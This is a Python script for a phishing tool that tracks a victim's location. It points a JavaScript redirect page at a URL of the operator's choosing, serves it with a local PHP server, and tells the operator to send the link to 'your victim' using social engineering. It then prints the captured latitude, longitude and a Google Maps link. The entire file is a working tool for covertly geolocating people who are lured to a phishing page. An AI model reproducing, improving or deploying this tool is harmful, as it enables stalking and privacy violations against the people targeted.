import time
import argparse
import subprocess as subp
import os
import sys

redirect = ""

def echo(self):
    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33","p":"35"}
    for i in tc:
        self = self.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
    self = self.replace("\cl", "\033[1;0;0m")
    print(self)

def configuring():
    echo("\h[+]\d Configuring Script..")
    fcontent = open("./script/js/button_redirect.js", "r").read()
    freplace = fcontent.replace("https://www.example.com/", url)
    f = open("./script/js/button_redirect.js", "w")
    f.write(freplace)
    f.close()
    time.sleep(2)
    enable_server()

def enable_server():
    with open("./tmp/server.txt", "w") as tmp:
        echo("\c[*]\d Starting Localhost WebServer...")
        subp.Popen(["php","-S","127.0.0.1:80", "-t", "script/"], stdout=tmp, stderr=tmp, stdin=subp.PIPE)
        time.sleep(2)
        cont = input("\033[1;33;48m[?]\033[1;0;0m Please say to continue [y/n] ")
        if cont=="y":
            echo("\h[+] Server Running On http://127.0.0.1:8080\d")
            echo("\B * You should send the link to your victim!")
            echo("\B * And the victim must open it!")
            echo("\B * Do with social engineering!")
            echo("\B * Press ctrl+c to stop tracking.\d")
            echo("\d-------------------------------------------\d")
            time.sleep(3)
            victim_wait()
        else:
            echo("\m[-]\d Restoring Configuration..")
            fcontent = open("./script/js/button_redirect.js", "r").read()
            f = open("./script/js/button_redirect.js", "w")
            freplace = fcontent.replace(url, "https://www.example.com/")
            f.write(freplace)
            f.close()
            echo("\m[!] Exit!\d")

def geolocate():
    try:
        exist = os.path.exists("./tmp/latlong.txt")
        if exist == True:
            latlong = open("./tmp/latlong.txt", "r").readlines()
            lat = latlong[0].strip()
            long = latlong[1].strip()
            acc = float(latlong[2].strip()) / 3
            echo("\h[+] GEOPOSITION LOCATED!! :\d\n")
            echo("\h[+] Latitude  : {} deg".format(lat))
            echo("\h[+] Longitude : {} deg".format(long))
            echo("\h[+] Accuracy  : {}.00m".format(int(acc)))
            echo("\h[+] Google Maps : https://maps.google.com/?q={},{}".format(lat,long))
            echo("\d-------------------------------------------\d")
            os.remove("./tmp/latlong.txt")
            echo("\c[*] Listening for victim...\d\n")
    except KeyboardInterrupt:
        echo("\n\m[*]\d Stopping Localhost Server...")
        os.popen("killall -9 php")
        echo("\m[-]\d Restoring Configuration..")
        fcontent = open("./script/js/button_redirect.js", "r").read()
        f = open("./script/js/button_redirect.js", "w")
        freplace = fcontent.replace(url, "https://www.example.com/")
        f.write(freplace)
        f.close()
        echo("\m[!]\d Exit!")
        sys.exit()

def victim_wait():
    try:
        always = False
        while True:
            exist = os.path.exists("./tmp/latlong.txt")
            if exist == False and always == False :
                echo("\c[*] Listening for victim...\d\n")
                always = True
            if exist == True:
                geolocate()
            time.sleep(1)
    except KeyboardInterrupt:
        echo("\n\m[*]\d Stopping Localhost Server...")
        os.popen("killall -9 php")
        echo("\m[-]\d Restoring Configuration..")
        fcontent = open("./script/js/button_redirect.js", "r").read()
        f = open("./script/js/button_redirect.js", "w")
        freplace = fcontent.replace(url, "https://www.example.com/")
        f.write(freplace)
        f.close()
        echo("\m[!]\d Exit!")
        sys.exit()

def get_parameters():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirect", help="after open the phising link, victim redirect to ?? (ex: https://google.com)")
    args = parser.parse_args()
    global url
    url = str(args.redirect)
    if args.redirect:
        configuring()
    else:
        parser.print_help()
get_parameters()